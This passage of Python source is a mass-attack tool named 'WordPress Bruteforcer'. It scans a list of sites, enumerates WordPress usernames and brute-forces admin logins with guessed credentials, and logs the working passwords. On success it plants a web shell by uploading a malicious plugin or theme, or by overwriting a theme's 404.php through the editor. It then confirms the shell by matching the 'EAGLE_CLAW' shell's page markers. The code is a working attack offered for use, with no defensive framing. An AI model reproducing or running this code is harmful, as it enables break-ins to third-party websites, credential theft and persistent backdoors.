                    'dynamic function loader',  # Comment in code
                    'enhanced path resolver',  # Comment in code
                    'execute command with multiple fallback methods',  # Comment in code
                    'multi-method file reader',  # Comment in code
                    'multi-method file writer',  # Comment in code
                    'enhanced directory scanner',  # Comment in code
                    'file/folder deletion with recursion',  # Comment in code
                    'get file permissions',  # Comment in code
                    'check if file is writable',  # Comment in code
                    'sort contents',  # Comment in code
                    'get system information',  # Comment in code
                    'process current request',  # Comment in code
                    'handle post operations',  # Comment in code
                    'handle get operations',  # Comment in code
                    'handle tab switching',  # Comment in code
                    'tab switching',  # JavaScript function
                    'modal functions',  # JavaScript function
                    'rename function',  # JavaScript function
                    'chmod function',  # JavaScript function
                    'auto-hide notifications',  # JavaScript function
                    'keyboard shortcuts',  # JavaScript function
                    'click outside modal to close'  # JavaScript function
                ]
                
                # Check if at least 3 indicators are present
                found_indicators = sum(1 for indicator in shell_indicators if indicator in content)
                if found_indicators >= 3:
                    return True
                    
                # Check for HTML structure specific to EAGLE_CLAW shell
                html_indicators = [
                    '<title>eagle_claw shell',  # Title tag
                    'class="container"',  # Main container
                    'class="header"',  # Header section
                    'class="tabs"',  # Tab navigation
                    'class="tab-content"',  # Tab content
                    'class="file-table"',  # File manager table
                    'class="terminal"',  # Terminal section
                    'class="info-grid"',  # System info grid
                    'class="modal"',  # Modal dialogs
                    'class="notification"',  # Notification messages
                    'class="path-bar"',  # Path navigation bar
                    'class="tools"',  # Tool buttons
                    'class="file-actions"',  # File action buttons
                    'class="edit-area"',  # Text editor
                    'class="sys-info"',  # System info display
                    'switchtab(',  # JavaScript function
                    'showNewFileModal(',  # JavaScript function
                    'showNewFolderModal(',  # JavaScript function
                    'closeModal(',  # JavaScript function
                    'renameItem(',  # JavaScript function
                    'chmodItem(',  # JavaScript function
                    'telegram-btn',  # Telegram button
                    'eagle',  # Eagle icon
                    '🦅'  # Eagle emoji
                ]
                
                # Check if at least 5 HTML indicators are present
                found_html = sum(1 for indicator in html_indicators if indicator in content)
                if found_html >= 5:
                    return True
                    
                # Check for specific CSS classes used in the shell
                css_indicators = [
                    'background: #0d1117',  # Dark background
                    'color: #c9d1d9',  # Light text color
                    'border-radius: 10px',  # Rounded corners
                    'box-shadow: 0 10px 30px',  # Shadow effect
                    'linear-gradient(to right',  # Gradient background
                    'tab-content.active',  # Active tab styling
                    'notification.success',  # Success notification
                    'notification.error',  # Error notification
                    'file-table thead',  # Table header styling
                    'terminal-output',  # Terminal output styling
                    'info-card',  # Info card styling
                    'modal.active',  # Active modal styling
                    'progress-bar',  # Progress bar styling
                    'perm-writable',  # Writable permission styling
                    'perm-readonly',  # Read-only permission styling
                    'separator-row'  # Separator row styling
                ]
                
                # Check if at least 3 CSS indicators are present
                found_css = sum(1 for indicator in css_indicators if indicator in content)
                if found_css >= 3:
                    return True
                    
        except Exception as e:
            pass
            
        return False
    
    def upload_plugin(self, url, session):
        try:
            foldername = self.random_string(7)
            
            # Load plugin upload page
            plugin_page = session.get(url + '/wp-admin/plugin-install.php?tab=upload',
                                     headers=self.get_random_headers(), timeout=15, verify=False)
            
            if plugin_page.status_code != 200:
                print(f'    [-] {self.fr}Failed to load plugin upload page')
                return None
                
            plugin_content = plugin_page.text
            
            # Collect all nonces
            nonces = self.collect_all_nonces(plugin_content)
            
            if '_wpnonce' not in nonces:
                print(f'    [-] {self.fr}Plugin nonce not found')
                return None
                
            # Prepare form data
            filedata = {
                '_wpnonce': nonces['_wpnonce'],
            }
            
            # Add other nonces if available
            if '_wp_http_referer' in nonces:
                filedata['_wp_http_referer'] = nonces['_wp_http_referer']
            if 'security' in nonces:
                filedata['security'] = nonces['security']
                
            # Check file exists
            if not os.path.exists('Files/plugin.zip'):
                print(f'    [-] {self.fr}plugin.zip not found')
                return None
                
            # Upload file
            files = {
                'pluginzip': (foldername + '.zip', open('Files/plugin.zip', 'rb'), 'application/zip')
            }
            
            upload_resp = session.post(url + '/wp-admin/update.php?action=upload-plugin',
                                      data=filedata, files=files, headers=self.get_random_headers(),
                                      timeout=60, verify=False)
            
            # Check response
            if upload_resp.status_code == 200:
                # Check shell paths - try both index.php and x.php
                shell_paths = [
                    url + '/wp-content/plugins/' + foldername + '/index.php',
                    url + '/wp-content/plugins/' + foldername + '/x.php'
                ]
                
                for shell_url in shell_paths:
                    if self.verify_shell(shell_url):
                        return shell_url
            else:
                print(f'    [-] {self.fr}Upload failed with status: {upload_resp.status_code}')
                
            return None
            
        except Exception as e:
            print(f'    [-] {self.fr}Plugin upload error: {str(e)[:50]}')
            return None
    
    def upload_theme(self, url, session):
        try:
            foldername = self.random_string(7)
            
            # Load theme upload page
            theme_page = session.get(url + '/wp-admin/theme-install.php?tab=upload',
                                    headers=self.get_random_headers(), timeout=15, verify=False)
            
            if theme_page.status_code != 200:
                print(f'    [-] {self.fr}Failed to load theme upload page')
                return None
                
            theme_content = theme_page.text
            
            # Collect all nonces
            nonces = self.collect_all_nonces(theme_content)
            
            if '_wpnonce' not in nonces:
                print(f'    [-] {self.fr}Theme nonce not found')
                return None
                
            # Prepare form data
            filedata = {
                '_wpnonce': nonces['_wpnonce'],
            }
            
            # Add other nonces if available
            if '_wp_http_referer' in nonces:
                filedata['_wp_http_referer'] = nonces['_wp_http_referer']
            if 'security' in nonces:
                filedata['security'] = nonces['security']
                
            # Check file exists
            if not os.path.exists('Files/theme.zip'):
                print(f'    [-] {self.fr}theme.zip not found')
                return None
                
            # Upload file
            files = {
                'themezip': (foldername + '.zip', open('Files/theme.zip', 'rb'), 'application/zip')
            }
            
            upload_resp = session.post(url + '/wp-admin/update.php?action=upload-theme',
                                      data=filedata, files=files, headers=self.get_random_headers(),
                                      timeout=60, verify=False)
            
            # Check response
            if upload_resp.status_code == 200:
                # Check shell paths - try both index.php and x.php
                shell_paths = [
                    url + '/wp-content/themes/' + foldername + '/index.php',
                    url + '/wp-content/themes/' + foldername + '/x.php'
                ]
                
                for shell_url in shell_paths:
                    if self.verify_shell(shell_url):
                        return shell_url
            else:
                print(f'    [-] {self.fr}Upload failed with status: {upload_resp.status_code}')
                
            return None
            
        except Exception as e:
            print(f'    [-] {self.fr}Theme upload error: {str(e)[:50]}')
            return None
    
    def upload_via_theme_editor(self, url, session):
        try:
            # Try multiple files for theme editor
            shell_files = ['x.php', 'index.php']
            
            for shell_file in shell_files:
                if not os.path.exists(f'Files/{shell_file}'):
                    continue
                    
                # Load theme editor page
                editor_page = session.get(url + '/wp-admin/theme-editor.php?file=404.php',
                                         headers=self.get_random_headers(), timeout=15, verify=False)
                editor_content = editor_page.text
                
                if 'theme-editor.php' not in editor_content or 'Update File' not in editor_content:
                    continue
                    
                # Extract nonce
                nonce = self.extract_nonce(editor_content)
                if not nonce:
                    continue
                    
                # Extract theme name
                theme_match = re.findall(r'name="theme" value="(.*?)"', editor_content)
                if not theme_match:
                    theme_match = re.findall(r'"theme":"(.*?)"', editor_content)
                    if not theme_match:
                        continue
                        
                theme_name = theme_match[0]
                
                # Read shell content
                with open(f'Files/{shell_file}', 'r') as f:
                    shell_content = f.read()
                    
                # Prepare post data
                post_data = {
                    '_wpnonce': nonce,
                    'wp_http_referer': '/wp-admin/theme-editor.php?file=404.php&theme=' + theme_name,
                    'newcontent': shell_content,
                    'action': 'edit-theme-plugin-file',
                    'theme': theme_name,
                    'docs-list': ''
                }
                
                # Update file
                update_resp = session.post(url + '/wp-admin/theme-editor.php',
                                          data=post_data, headers=self.get_random_headers(),
                                          timeout=30, verify=False)
                
                # Check shell URLs
                shell_urls = [
                    url + '/wp-content/themes/' + theme_name + '/404.php',
                    url + '/wp-content/themes/' + theme_name + '/index.php'
                ]
                
                for shell_url in shell_urls:
                    if self.verify_shell(shell_url):
                        return shell_url
                    
            return None
            
        except Exception as e:
            print(f'    [-] {self.fr}Theme editor error: {str(e)[:50]}')
            return None
    
    def try_all_upload_methods(self, url, session):
        upload_methods = [
            ("Plugin Upload", self.upload_plugin),
            ("Theme Upload", self.upload_theme),
            ("Theme Editor", self.upload_via_theme_editor)
        ]
        
        for method_name, method_func in upload_methods:
            print(f'    [*] Trying {method_name} method...')
            shell_url = method_func(url, session)
            if shell_url:
                print(f'    [+] {self.fg}Shell uploaded successfully: {shell_url}')
                return shell_url
            else:
                print(f'    [-] {self.fr}{method_name} method failed')
                
        return None
    
    def bruteforce_site(self, site):
        # Normalize URL to ensure it has a scheme
        url = self.normalize_url(site)
        domain = self.extract_domain(url)
        
        if not domain:
            print(' -| ' + url + ' --> ' + self.fr + '[Invalid URL]')
            return
            
        self.stats['total'] += 1
        
        # Create a new session for this site
        session = requests.Session()
        
        # First, check if it's WordPress
        is_wp, login_url = self.is_wordpress(url, session)
        if not is_wp:
            print(' -| ' + url + ' --> ' + self.fr + '[Not WordPress]')
            return
            
        # Only check DNS if it's WordPress
        try:
            socket.setdefaulttimeout(5)
            ip = socket.gethostbyname(domain.split(':')[0])
        except socket.gaierror:
            try:
                ip = socket.gethostbyname('www.' + domain.split(':')[0])
                url = url.replace(domain, 'www.' + domain)
                domain = 'www.' + domain.split(':')[0]
            except:
                print(' -| ' + url + ' --> ' + self.fr + '[DNS Failed - skipping]')
                return
        except socket.timeout:
            print(' -| ' + url + ' --> ' + self.fr + '[DNS Timeout - skipping]')
            return
        except Exception as e:
            print(' -| ' + url + ' --> ' + self.fr + '[DNS Error: ' + str(e)[:20] + ']')
            return
        finally:
            socket.setdefaulttimeout(None)
            
        self.stats['wordpress'] += 1
        print(' -| ' + url + ' --> ' + self.fg + '[WordPress Detected]')
        
        # Step 1: Try ALL predefined credentials first (NO LIMIT)
        print(' -| ' + url + ' --> ' + self.fc + '[Trying ALL predefined credentials...]')
        common_creds = self.generate_common_admin_credentials()
        
        for username, password in common_creds:
            success, admin_content = self.simple_login_check(
                session, url, username, password, login_url
            )
            
            if success:
                self.stats['successful'] += 1
                
                # Save result
                result = url + '/wp-login.php#' + username + '##' + password
                with open(self.output_dir + '/Successfully logged WordPress.txt', 'a', encoding='utf-8') as f:
                    f.write(result + "\n")
                    
                print(' -| ' + url + self.fg + ' -> SUCCESS: ' + username + ':' + password)
                
                # Check admin panel content for specific features
                if isinstance(admin_content, str) and len(admin_content) > 100:
                    if not all(x in admin_content for x in ['<div id="wpwrap">', '<div id="wpcontent">']):
                        print(' -| ' + url + self.fr + ' -> Limited admin panel - exiting')
                        return
                        
                    if any(x in admin_content.lower() for x in ['plugin', 'add new']):
                        with open(self.output_dir + '/plugin-install.txt', 'a') as f:
                            f.write(result + '\n')
                        print(' -| ' + url + self.fg + ' -> Plugin Access')
                        
                    if 'file manager' in admin_content.lower():
                        with open(self.output_dir + '/filemanager.txt', 'a') as f:
                            f.write(result + '\n')
                        print(' -| ' + url + self.fg + ' -> File Manager')
                        
                    admin_keywords = ['themes', 'plugins', 'users', 'settings', 'tools']
                    if sum(1 for k in admin_keywords if k in admin_content.lower()) >= 3:
                        with open(self.output_dir + '/full-admin.txt', 'a') as f:
                            f.write(result + '\n')
                        print(' -| ' + url + self.fg + ' -> Full Admin Access')
                        
                    # Try to upload shell using enhanced methods
                    print(' -| ' + url + self.fc + ' -> Attempting shell upload...')
                    shell_url = self.try_all_upload_methods(url, session)
                    if shell_url:
                        self.stats['shells'] += 1
                        with open(self.output_dir + '/Shells.txt', 'a', encoding='utf-8') as f:
                            f.write(shell_url + '\n')
                        print(' -| ' + shell_url + self.fg + ' -> Shell Uploaded!')
                    else:
                        print(' -| ' + url + self.fr + ' -> Shell upload failed')
                        
                return
        
        # Step 2: If predefined credentials failed, extract usernames
        print(' -| ' + url + ' --> ' + self.fc + '[Predefined credentials failed, extracting usernames...]')
        found_usernames = self.extract_usernames(url, session)
        if found_usernames:
            print(' -| ' + url + ' --> ' + self.fy + '[Found ' + str(len(found_usernames)) + ' real usernames!]')
            self.stats["usernames_found"] += len(found_usernames)
        else:
            print(' -| ' + url + ' --> ' + self.fr + '[No usernames found]')
            
        # Step 3: Generate extended credentials with found usernames and domain
        extended_creds = self.generate_extended_credentials(found_usernames, domain)
        print(' -| ' + url + ' --> ' + self.fc + '[Testing usernames with predefined passwords (MAX 45 attempts)...]')
        
        # Limit to 45 attempts for username+password combinations
        max_attempts = 45
        for i, (username, password) in enumerate(extended_creds):
            if i >= max_attempts:
                print(' -| ' + url + ' --> ' + self.fr + '[Reached limit of ' + str(max_attempts) + ' attempts]')
                break
                
            success, admin_content = self.simple_login_check(
                session, url, username, password, login_url
            )
            
            if success:
                self.stats['successful'] += 1
                
                # Save result
                result = url + '/wp-login.php#' + username + '##' + password
                with open(self.output_dir + '/Successfully logged WordPress.txt', 'a', encoding='utf-8') as f:
                    f.write(result + "\n")
                    
                print(' -| ' + url + self.fg + ' -> SUCCESS: ' + username + ':' + password)
                
                # Check admin panel content for specific features
                if isinstance(admin_content, str) and len(admin_content) > 100:
                    if not all(x in admin_content for x in ['<div id="wpwrap">', '<div id="wpcontent">']):
                        print(' -| ' + url + self.fr + ' -> Limited admin panel - exiting')
                        return
                        
                    if any(x in admin_content.lower() for x in ['plugin', 'add new']):
                        with open(self.output_dir + '/plugin-install.txt', 'a') as f:
                            f.write(result + '\n')
                        print(' -| ' + url + self.fg + ' -> Plugin Access')
                        
                    if 'file manager' in admin_content.lower():
                        with open(self.output_dir + '/filemanager.txt', 'a') as f:
                            f.write(result + '\n')
                        print(' -| ' + url + self.fg + ' -> File Manager')
                        
                    admin_keywords = ['themes', 'plugins', 'users', 'settings', 'tools']
                    if sum(1 for k in admin_keywords if k in admin_content.lower()) >= 3:
                        with open(self.output_dir + '/full-admin.txt', 'a') as f:
                            f.write(result + '\n')
                        print(' -| ' + url + self.fg + ' -> Full Admin Access')
                        
                    # Try to upload shell using enhanced methods
                    print(' -| ' + url + self.fc + ' -> Attempting shell upload...')
                    shell_url = self.try_all_upload_methods(url, session)
                    if shell_url:
                        self.stats['shells'] += 1
                        with open(self.output_dir + '/Shells.txt', 'a', encoding='utf-8') as f:
                            f.write(shell_url + '\n')
                        print(' -| ' + shell_url + self.fg + ' -> Shell Uploaded!')
                    else:
                        print(' -| ' + url + self.fr + ' -> Shell upload failed')
                        
                return
                
        self.stats['failed'] += 1
        print(' -| ' + url + ' --> ' + self.fr + '[Failed]')
    
    def process_site(self, site):
        try:
            site = site.strip()
            if site:
                self.bruteforce_site(site)
        except Exception as e:
            print(' -| Error processing ' + site + ': ' + str(e)[:50] + '...')
    
    def run(self, input_file):
        try:
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                sites = [line.strip() for line in f if line.strip()]
                
            if not sites:
                print(self.fr + '[!] No sites found in input file')
                return
                
            required_files = ['Files/plugin.zip', 'Files/theme.zip', 'Files/x.php']
            missing_files = [f for f in required_files if not os.path.exists(f)]
            
            if missing_files:
                print(self.fr + '[!] Missing required files:')
                for f in missing_files:
                    print('    - ' + f)
                print(self.fr + '[!] Please create these files before running the script')
                print(self.fc + '[*] Required files in "Files" directory:')
                print('    - plugin.zip (WordPress plugin with shell)')
                print('    - theme.zip (WordPress theme with shell)')
                print('    - x.php (Shell file)')
                return
                
            print(self.fw + """
╔══════════════════════════════════════════════════════════════╗
║                    WordPress Bruteforcer                      ║
╚══════════════════════════════════════════════════════════════╝
""")
            
            print(self.fc + '[*] Loaded ' + str(len(sites)).ljust(6) + ' sites')
            print(self.fc + '[*] Threads: ' + str(self.threads).ljust(5) + ' | Timeout: ' + str(self.timeout) + 's')
            print(self.fc + '[*] Username Enumeration: ENABLED | Smart Credentials: ENABLED')
            print(self.fc + '[*] Shell Upload: ENABLED | DNS Check: AFTER WordPress Detection')
            print(self.fg + '[*] Starting WordPress Bruteforce Attack...\n')
            
            start_time = time.time()
            
            with Pool(self.threads) as pool:
                pool.map(self.process_site, sites)
                
            elapsed = time.time() - start_time
            elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
            
            success_rate = "{:.2f}%".format((self.stats['successful'] / max(self.stats['wordpress'], 1)) * 100)
            
            print(self.fw + """
╔══════════════════════════════════════════════════════════════╗
║                          STATISTICS                           ║
╚══════════════════════════════════════════════════════════════╝
""")
            print(self.fc + '[*] Total Sites:        ' + str(self.stats['total']).ljust(10))
            print(self.fc + '[*] WordPress Sites:    ' + str(self.stats['wordpress']).ljust(10))
            print(self.fc + '[*] Usernames Found:    ' + str(self.stats['usernames_found']).ljust(10))
            print(self.fc + '[*] Successful Logins: ' + str(self.stats['successful']).ljust(10))
            print(self.fc + '[*] Failed Logins:      ' + str(self.stats['failed']).ljust(10))
            print(self.fc + '[*] Shells Uploaded:    ' + str(self.stats['shells']).ljust(10))
            print(self.fc + '[*] Success Rate:       ' + success_rate.ljust(10))
            print(self.fc + '[*] Time Elapsed:       ' + elapsed_str.ljust(10))
            
            # Show result files
            print("\n" + self.fg + '[+] Results saved in ' + self.output_dir + '/')
            
            files = [
                'Successfully logged WordPress.txt',
                'Shells.txt',
                'plugin-install.txt',
                'filemanager.txt',
                'full-admin.txt'
            ]
            
            for filename in files:
                filepath = os.path.join(self.output_dir, filename)
                if os.path.exists(filepath):
                    with open(filepath, 'r') as f:
                        count = len(f.readlines())
                    if count > 0:
                        print(' | ' + filename + ': ' + str(count) + ' entries')
                        
        except Exception as e:
            print("\n" + self.fr + '[!] Fatal Error: ' + str(e))

if __name__ == "__main__":
    try:
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    WordPress Bruteforcer                      ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        if len(sys.argv) < 2:
            print("\nUsage: python wp_bruteforcer.py <sites.txt>")
            print("\nFile format - one site per line:")
            print(" example.com")
            print(" http://site2.com")
            print(" https://www.site3.com")
            print("\nThe tool will detect WordPress sites and attempt to bruteforce them.")
            print("\nRequired files in 'Files' directory:")
            print(" - plugin.zip (WordPress plugin with shell)")
            print(" - theme.zip (WordPress theme with shell)")
            print(" - x.php (Shell file)")
            sys.exit(1)
            
        checker = UltimateWPChecker(threads=100)
        checker.run(sys.argv[1])
        
    except KeyboardInterrupt:
        print("\n" + Fore.RED + '[!] User interrupted the process')
    except Exception as e:
        print("\n" + Fore.RED + '[!] Error: ' + str(e))
